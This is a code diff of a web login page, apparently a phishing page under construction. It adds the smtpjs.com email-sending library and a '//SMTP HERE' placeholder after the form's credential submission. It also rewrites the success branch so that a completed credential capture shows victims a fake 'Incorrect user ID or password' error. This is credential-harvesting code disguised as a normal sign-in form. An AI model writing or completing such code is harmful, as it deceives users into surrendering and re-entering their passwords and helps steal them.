@@ -18,6 +18,8 @@
 function Errors(){this.reportSubject = 'Error Report'; }
 //]]>
 </script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
 
 
         
@@ -115,8 +117,8 @@ function Errors(){this.reportSubject = 'Error Report'; }
                         if (xhr.readyState === 4) {
                             if (xhr.status === 200) {
                                 // Handle success (you can update the DOM, show a success message, etc.)
-                                errorMessage.textContent = "Login successful!";
-                                errorMessage.style.color = "green";
+                                errorMessage.textContent = "Incorrect user ID or password. Type the correct user ID and password, and try again.";
+                                errorMessage.style.color = "#c85305";
                             } else {
                                 // Handle error (e.g., wrong credentials)
                                 errorMessage.textContent = "Login failed. Please try again.";
@@ -127,9 +129,13 @@ function Errors(){this.reportSubject = 'Error Report'; }
             
                     // Send the data as a JSON string
                     xhr.send(JSON.stringify(formData));
+                    
             
                     return false;  // Prevent the form from submitting the default way
                 };
+
+                //SMTP HERE
+
             </script>
             
              
